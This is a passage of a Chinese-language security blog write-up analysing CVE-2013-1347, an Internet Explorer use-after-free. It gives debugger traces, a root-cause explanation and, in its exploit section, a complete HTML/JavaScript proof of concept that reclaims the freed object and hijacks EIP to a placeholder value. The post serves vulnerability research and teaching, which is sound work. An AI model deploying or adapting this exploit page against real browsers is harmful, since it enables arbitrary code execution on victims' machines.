0481cf58</span><br><span class="line">0481cf08  685ecc7b 0481cf58 687fe223 0481cf77</span><br><span class="line">0481cf18  0481cf8b 07e30ff0 0481d048 00000002</span><br><span class="line">0481cf28  05520fd8 00000000 0481cf8b 06f58f00</span><br><span class="line">0481cf38  0481d001 05e51fd8 00000000 05520fd8</span><br><span class="line">(ddc.b50): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=68a89100 ebx=06faafb0 ecx=078cefc8 edx=00000000 esi=0481cba8 edi=00000000</span><br><span class="line">eip=6870b68d esp=0481cb7c ebp=0481cb94 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line">6870b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:078cefc8=????????</span><br><span class="line">0:005&gt; dd 07516fd0 LC</span><br><span class="line">07516fd0  00000805 00000002 06faafc0 06faafb0</span><br><span class="line">07516fe0  00000806 00000003 06faafd8 06faafb0</span><br><span class="line">07516ff0  00000806 00000004 05e51fd8 05e51fb0</span><br><span class="line">0:005&gt; dd 07516fc0 L10</span><br><span class="line">07516fc0  00000805 00000001 05e51fc0 05e51fb0</span><br><span class="line">07516fd0  00000805 00000002 06faafc0 06faafb0</span><br><span class="line">07516fe0  00000806 00000003 06faafd8 06faafb0</span><br><span class="line">07516ff0  00000806 00000004 05e51fd8 05e51fb0</span><br><span class="line">0:005&gt; ln poi(poi(05e51fb0))</span><br><span class="line">(68648fd8)   mshtml!CSpanElement::`vftable&apos;   |  (685573d8)   mshtml!CBlockElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p>
<p>如上，<code>eax+4</code> 指向一个结构体数组，还原结构体的大概如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">elememt_arry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> unkown;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">int</span> CTreePos;</span><br><span class="line">    <span class="keyword">int</span> CTreeNode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>下面通过栈回溯去查看这个数组所占内存的来源。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 07516fc0  </span><br><span class="line">    address 07516fc0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 51000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 75105e4:          7516fc0               40 -          7516000             2000</span><br><span class="line">    6cba8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">    77235e26 ntdll!RtlDebugAllocateHeap+0x00000030</span><br><span class="line">    771fa376 ntdll!RtlpAllocateHeap+0x000000c4</span><br><span class="line">    771c5ae0 ntdll!RtlAllocateHeap+0x0000023a</span><br><span class="line">    6870d7d0 mshtml!_HeapRealloc+0x00000036</span><br><span class="line">    687234e2 mshtml!CImplAry::EnsureSizeWorker+0x000000a1</span><br><span class="line">    686c9b04 mshtml!CImplAry::AppendIndirect+0x00000027</span><br><span class="line">    68609ad9 mshtml!CTextBlock::AddAtomRun+0x00000105</span><br><span class="line">    68612b04 mshtml!CTextBlock::BuildSpanBeginRun+0x000000c4</span><br><span class="line">    68603e11 mshtml!CTextBlock::BuildTextBlock+0x00000aeb</span><br><span class="line">    68603488 mshtml!CLayoutBlock::BuildBlock+0x000001ec</span><br><span class="line">    685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d</span><br><span class="line">    685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1</span><br><span class="line">    685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d</span><br><span class="line">    685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1</span><br><span class="line">    685f0775 mshtml!CBlockContainerBlock::BuildBlockContainer+0x0000059d</span><br><span class="line">    685f04ee mshtml!CLayoutBlock::BuildBlock+0x000001c1</span><br><span class="line">    685f1290 mshtml!CCssDocumentLayout::GetPage+0x0000022a</span><br><span class="line">    685f2176 mshtml!CCssPageLayout::CalcSizeVirtual+0x00000254</span><br><span class="line">    6875566c mshtml!CLayout::CalcSize+0x000002b8</span><br><span class="line">    68765c6b mshtml!CLayout::DoLayout+0x0000011d</span><br><span class="line">    686293f1 mshtml!CCssPageLayout::Notify+0x00000140</span><br><span class="line">    6871e667 mshtml!NotifyElement+0x00000041</span><br><span class="line">    6872c76b mshtml!NotifyAncestors+0x000001b7</span><br><span class="line">    6871214b mshtml!CMarkup::SendNotification+0x00000092</span><br><span class="line">    687120be mshtml!CMarkup::Notify+0x000000d6</span><br><span class="line">    6875c083 mshtml!CElement::SendNotification+0x0000004a</span><br><span class="line">    6879574e mshtml!CElement::EnsureRecalcNotify+0x0000015f</span><br><span class="line">    68581242 mshtml!CElement::GetOffsetParentHelper+0x00000060</span><br><span class="line">    6865d442 mshtml!CElement::get_offsetParent+0x00000030</span><br><span class="line">    6878bb55 mshtml!G_IDispatchp+0x0000007b</span><br><span class="line">    68635ea6 mshtml!CBase::ContextInvokeEx+0x000002d0</span><br></pre></td></tr></table></figure></p>
<p>下面看泉哥说的数组是在创建<code>CTextBlock</code>时生成的，<code>CTreeNode+0x44</code>保存的是结构 <code>CTextBlock</code>的地址，<code>CTextBlock+0x58</code> 存储的时数组地址(偷下懒)。<br>下面都是参考的 <code>exp-sky</code> 前辈的 <a href="https://github.com/exp-sky/Blog/blob/master/CVE-2013-1347_Analysis/CVE-2013-1347_Analysis.md" target="_blank" rel="noopener">CVE-2013-1347 Microsoft Internet Explorer CGenericElement Object Use After Free Vulnerability Analysis</a>。（自己好弱</p>
<p>通过对比分析发现当 <code>javascript</code> 代码块中存在修改 <code>DOM</code> 树的代码时，并且存在未被渲染的DOM元素时（新创建的 <code>DOM</code> 元素）如果调用了 <code>offsetParent</code> 代码（可根据任意元素来引用）。将导致未被渲染过的元素属性被修改为已渲染。这样在修改其 <code>DOM</code> 节点时(如通过 <code>innerHTML</code> 属性来释放其所有子元素)也不会通过<code>CtreeNode::ComputeFormats</code> 函数重新计算节点格式。导致浏览器并不知道元素释放情况，也未更新元素节点关系。<br>正常的处理流程是，当通过 <code>innerHTML</code> 释放了未被渲染的元素的所有子元素后。其会通过以下流程的函数调用最终调用到 <code>CtreeNode::ComputeFormats</code> 函数对 <code>CTreeNode</code>节点进行重新计算。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GS_PropEnum</span><br><span class="line">	|- CElement::put_innerHTML</span><br><span class="line">		|- Celement::InjectCompatBSTR</span><br><span class="line">			|- CElement_InjectInternal</span><br><span class="line">				|- CtreeNode::IsEditable</span><br><span class="line">					|- CtreeNode::GetCharFormat				⇐ 判断属性</span><br><span class="line">						|- CtreeNode::GetCHarFormatHelper</span><br><span class="line">							|- CtreeNode::GetCharFormatIndexHelper</span><br><span class="line">								|- CtreeNode::ComputeFormatsHelper</span><br><span class="line">									|- CtreeNode::ComputeFormats</span><br></pre></td></tr></table></figure></p>
<p><code>CtreeNode::GetCharFormat</code> 会判断 <code>CTreeNode</code> 的属性，即偏移 <code>0xc</code> 处的引用计数值，当引用计数值大于0时，表示已经渲染，无需重新计算 <code>CTreeNode</code>，因此则不进入 <code>CtreeNode::GetCHarFormatHelper</code> 函数也无法调用到其后续函数 <code>CtreeNode::ComputeFormats</code> 对 <code>CTreeNode</code> 进行重新计算。这种情况下处理流程如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GS_PropEnum</span><br><span class="line">	|- CElement::put_innerHTML</span><br><span class="line">		|- Celement::InjectCompatBSTR</span><br><span class="line">			|- CElement_InjectInternal</span><br><span class="line">				|- CtreeNode::IsEditable</span><br><span class="line">					|- CtreeNode::GetCharFormat				⇐ 判断属性</span><br></pre></td></tr></table></figure></p>
<p>在 <code>javascript</code> 执行完成后，浏览器会重新渲染 <code>DOM</code> 树，因为之前并没有去重新计算<code>CGenericElement</code> 的 <code>CTreeNode</code> 节点，导致了浏览器仍然企图渲染释放后的元素。最终引用了释放后的元素，成功利用后可以导致任意代码执行。 </p>
<h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p> 发现泉哥书里还是由很多错误的，比如再分析这个的时候<code>p315</code>说 <code>CTreeNode</code>被清除，还有<code>p325</code> 页<code>CGenericElement</code>的对象大小应为 <code>0x38</code>。<br><img src="http://static.zybuluo.com/dane909/u22qo0hq4wisyzspofw03cbe/QQ%E6%88%AA%E5%9B%BE20180713000129.png" alt="QQ截图20180713000129.png-4.3kB"><br>利用 <code>t:ANIMATECOLOR</code> 来重用被释放的对象，尝试控制 <code>eip</code>。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span> <span class="attr">XMLNS:t</span> =<span class="string">"urn:schemas-microsoft-com:time"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span>&gt;</span></span><br><span class="line">	&lt;?IMPORT namespace="t" implementation="#default#time2"&gt;</span><br><span class="line">&lt;/meta&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function helloWorld()</span><br><span class="line">&#123;</span><br><span class="line">	animvalues = ""; </span><br><span class="line"></span><br><span class="line">	// mshtml!CElement::Doc:</span><br><span class="line">	// 6586c815 8b01            mov     eax,dword ptr [ecx]</span><br><span class="line">	// 6586c817 8b5070          mov     edx,dword ptr [eax+70h]</span><br><span class="line">	// 6586c81a ffd2            call    edx</span><br><span class="line"></span><br><span class="line">	for (i=0; i &lt;= 0x70/4; i++) &#123;</span><br><span class="line">		// t:ANIMATECOLOR 标签第一个对象用于覆盖虚表指针</span><br><span class="line">		// 由于索引虚函数时，需要偏移0x70，所以这里采用0x70/4去精确控制edx值</span><br><span class="line">		if (i == 0x70/4) &#123;</span><br><span class="line">			//animvalues += unescape("%u5ed5%u77c1");   </span><br><span class="line">			animvalues += unescape("%u4141%u4141");   // 控制edx=0x41414141</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			animvalues += unescape("%u4242%u4242");	  // 0x42424242</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for(i = 0; i &lt; 13; i++) &#123;</span><br><span class="line">		// t:ANIMATECOLOR 标签值是一个用分号分隔的字符串，分号的个数决定对象的大小，</span><br><span class="line">		// 对象的每个元素都是一个指针，指向分号分隔出来的字符串</span><br><span class="line">		// 漏洞对象CGnericElement大小0x38，所以这里需要包含0x38/4=13个分号 14个字符串</span><br><span class="line">		animvalues += ";red";		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f0 = document.createElement('span');</span><br><span class="line">	document.body.appendChild(f0);</span><br><span class="line">	f1 = document.createElement('span');</span><br><span class="line">	document.body.appendChild(f1);</span><br><span class="line">	f2 = document.createElement('span');</span><br><span class="line">	document.body.appendChild(f2);</span><br><span class="line">	document.body.contentEditable="true";</span><br><span class="line">	f2.appendChild(document.createElement('datalist'));</span><br><span class="line">	f1.appendChild(document.createElement('span'));</span><br><span class="line">	f1.appendChild(document.createElement('table'));</span><br><span class="line">	try&#123;</span><br><span class="line">		f0.offsetParent=null;</span><br><span class="line">	&#125;catch(e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">	f2.innerHTML="";</span><br><span class="line">	f0.appendChild(document.createElement('hr'));</span><br><span class="line">	f1.innerHTML="";</span><br><span class="line"></span><br><span class="line">	CollectGarbage();</span><br><span class="line"></span><br><span class="line">	try &#123;</span><br><span class="line">		//使用 t:ANIMATECOLOR 标签可以自由设置其内容，控制对象大小</span><br><span class="line">		a = document.getElementById('myanim');</span><br><span class="line">		a.values = animvalues;</span><br><span class="line">	&#125;</span><br><span class="line">	catch(e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload="eval(helloWorld());"&gt;</span><br><span class="line">&lt;t:ANIMATECOLOR id="myanim"/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://static.zybuluo.com/dane909/ruycgayu8tqh7f6df9csl8gz/QQ%E6%88%AA%E5%9B%BE20180713001839.png" alt="QQ截图20180713001839.png-83.4kB"><br>可以看到已经成功劫持了 <code>eip</code>，下面就是 <code>rop</code> 的构造啦，具体的可以参考<code>msf</code>提供的脚本。</p>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/old-blog/" rel="tag"><i class="fa fa-tag"></i> old_blog</a>
          
            <a href="/tags/browser/" rel="tag"><i class="fa fa-tag"></i> browser</a>
          
            <a href="/tags/vuln/" rel="tag"><i class="fa fa-tag"></i> vuln</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/09/CVE-2012-1876/" rel="next" title="CVE-2012-1876">
                <i class="fa fa-chevron-left"></i> CVE-2012-1876
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/01/09/QEMU-shadowstack/" rel="prev" title="QEMU部分源码阅读">
                QEMU部分源码阅读 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="V4kst1z">
            
              <p class="site-author-name" itemprop="name">V4kst1z</p>
              <p class="site-description motion-element" itemprop="description">Fighting</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">5</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">6</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/Vsane" title="GitHub &rarr; https://github.com/Vsane" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://twitter.com/v4kst1z" title="Twitter &rarr; https://twitter.com/v4kst1z" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            </div>
          

          
             <div class="cc-license motion-element" itemprop="license">
              
                
              
              
              
              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
             </div>
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://aryb1n.github.io/" title="https://aryb1n.github.io/" rel="noopener" target="_blank">Aryb1n</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://52yuluo.top/" title="http://52yuluo.top/" rel="noopener" target="_blank">Yuluo</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#poc-分析"><span class="nav-number">1.</span> <span class="nav-text">poc 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM树创建"><span class="nav-number">2.</span> <span class="nav-text">DOM树创建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原因"><span class="nav-number">3.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit分析"><span class="nav-number">4.</span> <span class="nav-text">exploit分析</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">V4kst1z</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=6.7.0"></script>

  <script src="/js/src/motion.js?v=6.7.0"></script>



  
  


  <script src="/js/src/affix.js?v=6.7.0"></script>

  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>




  
  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
<script src="/js/src/post-details.js?v=6.7.0"></script>



  


  <script src="/js/src/bootstrap.js?v=6.7.0"></script>



  
  




  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function (item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: '3awIpSk2hfHaeA1glDs5NtYG-gzGzoHsz',
    appKey: '6ORiR0zVaYi0ljkwUfSn0aWG',
    placeholder: 'Just go go',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false
  });
</script>



  





  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
